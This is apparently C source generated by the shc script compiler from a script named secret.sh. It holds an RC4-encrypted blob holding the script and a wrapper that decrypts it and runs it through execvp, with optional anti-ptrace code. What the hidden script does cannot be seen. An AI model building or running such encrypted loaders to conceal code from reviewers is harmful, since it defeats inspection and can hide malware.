#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	./shc -v -r -T -f secret.sh 
#endif

static  char data [] = 
#define      msg1_z	42
#define      msg1	((&data[5]))
	"\276\114\255\005\301\077\113\103\151\201\041\013\222\072\225\272"
	"\352\256\071\225\241\357\115\174\062\275\367\227\310\242\072\324"
	"\155\005\200\310\110\002\237\257\370\223\072\015\244\246\105\173"
	"\153\035\161"
#define      msg2_z	19
#define      msg2	((&data[55]))
	"\224\167\356\013\156\364\266\055\017\160\173\217\222\246\331\030"
	"\320\243\203\276\100\025\142"
#define      lsto_z	1
#define      lsto	((&data[74]))
	"\333"
#define      inlo_z	3
#define      inlo	((&data[75]))
	"\052\354\152"
#define      opts_z	1
#define      opts	((&data[78]))
	"\364"
#define      tst1_z	22
#define      tst1	((&data[84]))
	"\230\140\156\127\255\171\210\165\117\273\263\001\044\360\160\233"
	"\213\265\004\034\320\314\347\151\155\142\317"
#define      date_z	1
#define      date	((&data[106]))
	"\032"
#define      chk1_z	22
#define      chk1	((&data[111]))
	"\011\144\156\071\225\345\061\057\264\114\252\377\076\162\144\263"
	"\140\217\137\026\053\111\213\261\157\224\371\345\047"
#define      pswd_z	256
#define      pswd	((&data[156]))
	"\101\224\155\052\127\324\202\335\276\223\165\037\002\315\314\036"
	"\051\073\266\361\030\245\261\152\023\176\000\043\344\113\125\307"
	"\117\247\201\173\003\226\045\072\242\066\060\206\012\142\055\244"
	"\341\045\250\371\312\131\144\335\330\144\001\275\260\126\204\000"
	"\376\006\173\001\235\241\074\077\330\154\305\342\317\363\207\260"
	"\030\057\252\342\211\017\300\142\164\301\037\044\030\244\044\026"
	"\252\240\030\110\101\124\207\031\300\115\374\220\101\203\101\131"
	"\262\353\074\074\373\374\236\157\275\276\224\325\142\271\353\015"
	"\131\003\125\233\130\335\264\031\053\260\251\154\064\352\306\346"
	"\326\002\043\322\376\301\101\274\200\326\221\343\217\175\360\351"
	"\201\106\205\331\044\071\362\120\352\234\275\036\206\203\005\135"
	"\205\050\057\204\352\161\101\152\107\323\116\327\120\077\301\322"
	"\206\106\253\252\200\236\373\152\072\270\211\301\073\216\036\301"
	"\267\116\106\241\277\207\014\007\132\133\336\253\232\240\175\040"
	"\347\050\313\147\307\306\322\001\176\133\302\272\352\341\173\241"
	"\057\302\103\356\111\120\365\244\253\324\120\106\165\315\146\134"
	"\366\061\303\275\367\225\277\166\361\202\060\334\143\254\176\223"
	"\157\302\201\271\310\300\126\066\371\120\034\041\125\153\272\226"
	"\000\047\300\127\374\102\065\272\325\252\332\330\170\246\366\241"
	"\342\255\223\252\156\352\341\147\072\376"
#define      rlax_z	1
#define      rlax	((&data[450]))
	"\302"
#define      shll_z	10
#define      shll	((&data[451]))
	"\323\220\346\206\035\046\023\000\022\122\153"
#define      tst2_z	19
#define      tst2	((&data[465]))
	"\052\367\043\323\016\034\253\356\267\241\146\260\042\366\034\002"
	"\354\260\265\351\153\361\000\242"
#define      chk2_z	19
#define      chk2	((&data[490]))
	"\244\317\274\206\130\143\322\005\217\114\265\036\104\070\036\146"
	"\166\160\376\122\231\270\110"
#define      text_z	1230
#define      text	((&data[605]))
	"\352\072\022\122\164\021\334\004\173\040\053\345\214\022\250\365"
	"\074\237\030\074\101\026\025\134\272\344\030\100\140\150\162\113"
	"\242\204\236\026\226\172\033\021\233\106\367\047\130\237\034\225"
	"\077\065\322\200\113\347\334\005\313\365\106\054\135\270\170\377"
	"\075\026\026\324\221\062\345\055\170\335\124\321\175\161\147\274"
	"\247\071\075\362\040\031\370\354\016\077\031\154\370\221\154\066"
	"\226\044\026\123\303\260\071\347\310\253\034\001\124\204\256\244"
	"\300\175\024\032\347\335\003\211\162\354\307\246\006\152\026\051"
	"\277\255\052\324\342\353\351\341\077\316\112\365\373\303\263\245"
	"\047\106\047\171\012\231\243\161\277\001\011\353\166\215\341\015"
	"\001\141\116\022\301\325\225\111\275\300\225\024\167\315\254\043"
	"\127\242\301\121\134\375\027\305\356\247\003\236\356\167\136\117"
	"\355\237\007\120\375\336\213\036\275\374\057\136\152\340\260\305"
	"\015\346\244\317\351\271\264\223\173\332\154\114\202\243\336\235"
	"\044\023\326\125\131\075\311\203\236\004\124\164\111\021\253\204"
	"\065\220\177\156\362\130\244\201\176\066\342\051\213\062\040\177"
	"\211\136\331\010\027\117\332\001\100\341\105\007\357\320\122\167"
	"\062\172\311\105\175\223\246\014\253\211\356\340\245\101\307\263"
	"\305\146\355\213\042\140\200\046\214\377\105\074\374\333\170\234"
	"\370\310\236\126\327\076\011\236\270\046\212\236\037\031\135\242"
	"\040\122\146\230\321\314\253\364\160\240\120\262\366\041\040\203"
	"\136\240\266\263\304\201\172\223\075\060\130\203\377\171\372\265"
	"\066\332\372\156\363\015\217\063\004\317\071\330\125\071\367\371"
	"\147\344\105\336\373\205\026\165\146\324\266\367\201\215\077\230"
	"\160\342\025\137\256\342\071\367\311\264\172\355\270\270\243\012"
	"\275\064\154\216\170\046\302\330\176\215\032\353\025\375\355\154"
	"\177\253\056\252\255\343\365\250\014\064\220\066\160\344\355\261"
	"\022\072\246\207\202\302\155\165\105\044\333\245\006\011\343\355"
	"\210\112\004\047\000\267\015\213\135\052\161\266\334\131\345\122"
	"\251\241\332\047\255\160\237\003\224\362\000\037\370\174\223\041"
	"\052\050\166\335\254\352\372\305\021\330\057\015\344\317\154\261"
	"\260\061\225\146\361\013\000\065\377\207\225\263\043\356\171\323"
	"\316\231\012\010\365\120\304\021\025\065\321\225\347\306\200\250"
	"\206\042\013\136\373\257\231\226\170\050\044\366\222\243\352\257"
	"\304\141\266\037\300\204\351\223\300\025\346\362\107\030\102\226"
	"\004\316\367\235\363\041\065\030\046\046\123\012\011\241\301\161"
	"\002\204\245\137\133\054\331\060\103\034\225\107\247\315\237\004"
	"\057\363\000\164\200\327\337\011\353\167\241\343\236\317\334\251"
	"\107\241\206\056\154\045\326\272\123\011\132\214\172\101\037\326"
	"\123\055\370\070\030\122\012\122\146\253\333\002\020\336\125\316"
	"\033\354\352\201\252\314\207\216\306\303\356\025\074\004\030\227"
	"\247\360\174\266\016\366\101\025\067\355\246\132\017\277\137\132"
	"\040\217\154\066\054\040\224\365\303\174\176\035\175\134\247\106"
	"\052\111\353\235\332\301\103\345\330\344\143\241\232\255\376\320"
	"\133\252\301\223\237\106\123\015\214\015\010\000\173\024\171\101"
	"\060\157\355\030\175\263\130\050\066\007\140\351\143\315\006\137"
	"\323\237\316\005\316\123\070\045\266\227\151\106\236\100\061\367"
	"\213\043\123\166\266\061\101\100\371\106\146\243\371\252\306\007"
	"\055\213\011\334\335\216\270\310\064\260\205\360\362\152\206\134"
	"\160\206\022\122\332\231\331\211\253\220\075\342\342\363\263\011"
	"\175\374\053\222\022\103\044\122\275\325\110\356\044\336\341\015"
	"\071\065\060\130\116\340\373\367\023\141\324\006\316\257\376\012"
	"\017\360\116\061\234\064\246\224\177\021\240\047\042\247\140\026"
	"\007\025\311\272\112\172\152\124\012\027\332\030\154\134\272\171"
	"\344\200\127\200\324\000\014\150\365\201\221\112\311\121\272\071"
	"\360\235\112\161\234\134\311\347\276\235\325\334\106\172\351\114"
	"\347\321\031\101\017\316\043\273\000\354\375\364\234\322\136\273"
	"\053\266\374\275\065\031\206\333\163\270\071\214\020\050\211\172"
	"\065\027\025\210\144\266\270\130\235\272\127\136\140\124\211\227"
	"\147\024\104\270\375\226\150\174\224\063\125\374\117\174\046\254"
	"\272\357\110\025\050\265\053\217\353\024\365\263\343\115\140\027"
	"\364\160\056\356\153\151\204\056\211\355\141\127\063\336\117\366"
	"\156\162\307\365\356\056\067\372\172\101\317\211\120\313\205\045"
	"\315\055\271\274\277\161\103\164\371\206\345\231\332\126\022\361"
	"\264\301\126\370\221\137\061\101\301\175\007\373\002\167\134\270"
	"\077\360\316\230\013\127\160\140\214\256\037\271\135\052\226\262"
	"\202\344\021\312\061\334\051\300\036\263\326\012\340\260\247\142"
	"\270\144\053\120\302\371\155\217\317\177\215\004\021\210\200\322"
	"\236\043\203\034\066\262\057\107\022\073\260\152\354\052\312\222"
	"\063\042\046\324\123\147\331\320\241\343\211\247\074\212\124\376"
	"\146\130\236\166\165\227\264\370\177\202\070\321\025\071\041\265"
	"\200\167\035\236\377\325\060\253\175\011\317\201\056\373\363\050"
	"\063\100\371\340\110\321\142\155\143\372\313\165\070\141\324\073"
	"\157\350\055\355\135\150\077\361\077\047\124\250\063\124\227\062"
	"\276\250\014\014\327\107\207\364\152\214\003\036\372\223\025\240"
	"\345\040\263\360\121\202\232\024\356\153\223\062\052\130\156\130"
	"\125\302\354\332\343\114\374\005\061\034\340\354\347\353\013\220"
	"\071\140\255\126\236\323\120\254\377\154\315\206\203\160\115\343"
	"\235\224\144\072\053\166\061\044\322\216\077\242\125\007\142\100"
	"\250\304\120\154\113\320\265\104\202\162\313\262\043\020\161\374"
	"\212\067\323\314\216\017\244\156\146\354\022\365\056\242\307\023"
	"\025\215\025\325\233\340\376\334\145\206\056\154\242\001\203\267"
	"\011\205\030\322\011\332\333\034\237\243\061\174\216\315\250\202"
	"\012\072\265\360\147\055\315\274\377\112\055\146\007\324\237\104"
	"\307\300\135\277\255\154\377\306\331\367\127\105\055\000\310\067"
	"\072\175\047\241\252\365\135\251\077\213\017\106\140\257\213\047"
	"\157\350\347\035\125\346\343\056\335"
#define      xecc_z	15
#define      xecc	((&data[1895]))
	"\073\212\042\052\126\262\356\223\203\273\162\122\223\143\240\252"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
